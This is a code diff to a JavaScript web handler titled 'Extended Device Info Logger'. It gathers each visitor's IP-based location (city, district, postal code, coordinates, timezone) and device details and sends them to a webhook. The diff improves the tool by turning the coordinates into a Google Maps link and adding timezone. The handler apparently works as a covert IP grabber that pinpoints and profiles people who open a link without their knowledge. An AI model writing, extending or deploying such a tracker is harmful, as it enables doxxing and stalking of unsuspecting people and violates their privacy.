@@ -10,7 +10,6 @@ async function sendToWebhook(message) {
             body: JSON.stringify(message),
         });
 
-        // Check if the response was successful
         if (!response.ok) {
             console.error(`Failed to send data to webhook. Status: ${response.status}`);
         } else {
@@ -73,6 +72,11 @@ export default async function handler(req, res) {
                    /Android/.test(userAgent) ? 'Android' :
                    /Linux/.test(userAgent) ? 'Linux' : 'Unknown';
 
+        // Format the coordinates as a clickable link to Google Maps
+        const coords = ipDetails.lat && ipDetails.lon
+            ? `[${ipDetails.lat}, ${ipDetails.lon}](https://www.google.com/maps?q=${ipDetails.lat},${ipDetails.lon})`
+            : "Not available";
+
         const message = {
             username: "Extended Device Info Logger",
             embeds: [
@@ -91,8 +95,8 @@ export default async function handler(req, res) {
                         { name: "City", value: `\`${ipDetails.city || "Unknown"}\``, inline: true },
                         { name: "District", value: `\`${ipDetails.district || "Unknown"}\``, inline: true },
                         { name: "Postal Code", value: `\`${ipDetails.zip || "Unknown"}\``, inline: true },
-                        { name: "Latitude", value: `\`${ipDetails.lat || "Unknown"}\``, inline: true },
-                        { name: "Longitude", value: `\`${ipDetails.lon || "Unknown"}\``, inline: true },
+                        { name: "Coords", value: coords, inline: true },
+                        { name: "Timezone", value: `\`${ipDetails.timezone || "Unknown"}\``, inline: true },
                         { name: "Device Info", value: `\`${userAgent}\``, inline: false },
                         { name: "Device Type", value: `\`${deviceType}\``, inline: true },
                         { name: "Operating System", value: `\`${os}\``, inline: true },
